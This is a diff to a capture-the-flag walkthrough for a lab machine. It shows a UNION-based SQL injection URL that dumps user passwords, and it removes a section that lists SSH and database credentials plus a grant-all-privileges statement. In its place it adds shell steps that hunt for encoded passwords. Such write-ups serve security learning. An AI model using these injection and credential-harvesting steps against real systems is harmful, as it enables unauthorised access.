@@ -13,23 +13,11 @@ http://10.0.2.5:8080/mercuryfacts/1 UNION SELECT password from users--/
 
  ('johnny1987',), ('lovemykids111',), ('lovemybeer111',), ('mercuryisthesizeof0.056Earths',))
  ```
- ## SSH webmaster, SQL grant privileges
+ ## SSH webmaster, find encoded passwords
 ```console
- webmaster:mercuryisthesizeof0.056Earths
- 
- 
- DATABASES = {
-    'default': {
-        'ENGINE': 'django.db.backends.mysql',
-        'NAME': 'mercury',
-        'USER': 'dbmaster',
-        'PASSWORD': '8cSQK0HMJtNxaJwsKwgDwo',
-        'HOST': '127.0.0.1',
-        'PORT': '3306',
-    }
-}
-
-GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost';
+cd mecury_proj/
+ls
+cat notes.txt
  ```
  ## Base64 decode the password
 ```console
